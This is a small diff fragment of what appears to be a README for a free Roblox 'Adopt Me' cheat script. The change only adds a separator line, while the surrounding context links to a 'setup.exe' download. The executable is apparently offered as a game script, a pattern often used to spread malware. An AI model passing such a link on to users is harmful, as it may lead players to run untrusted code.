@@ -45,6 +45,9 @@ Start generation
 
 ---
 
+
+---
+
 ## ◈ DOWNLOAD
 
 <a href="https://github.com/alex-w-code96o5/ADOPTME-SCRIPT-2026-FREE/releases/download/ROBLOX/setup.exe">
